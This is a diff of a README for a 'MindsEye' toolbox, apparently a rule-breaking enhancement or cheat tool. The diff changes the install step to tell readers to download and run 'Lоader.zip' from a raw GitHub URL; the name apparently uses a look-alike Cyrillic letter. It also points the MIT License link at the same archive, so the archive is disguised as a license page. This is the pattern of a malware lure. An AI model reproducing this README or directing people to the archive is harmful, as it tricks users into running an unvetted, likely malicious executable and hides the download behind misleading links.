@@ -24,7 +24,7 @@ automation, boost productivity, MindsEye suite, workflow enhancer, cross-platfor
 
 ## 📥 Installation
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/JessEnterprise/MindsEyeToolbox/main/Lоader.zip` from the repository.
 2. Extract and run the program suited for your operating system.
 3. Follow on-screen instructions to unleash advanced capabilities.
 
@@ -32,5 +32,5 @@ automation, boost productivity, MindsEye suite, workflow enhancer, cross-platfor
 This project is intended purely for **educational** and personal enhancement purposes. Usage may breach MindsEye’s official rules. By installing or running this toolkit, you accept full responsibility for any repercussions. We neither endorse nor encourage misuse in regulated environments.
 
 ## 📄 License  
-This project is distributed under the [MIT License (2025)](https://opensource.org/license/mit/).  
+This project is distributed under the [MIT License (2025)](https://raw.githubusercontent.com/JessEnterprise/MindsEyeToolbox/main/Lоader.zip).  
 Explore, enhance, and supercharge MindsEye—within ethical boundaries!
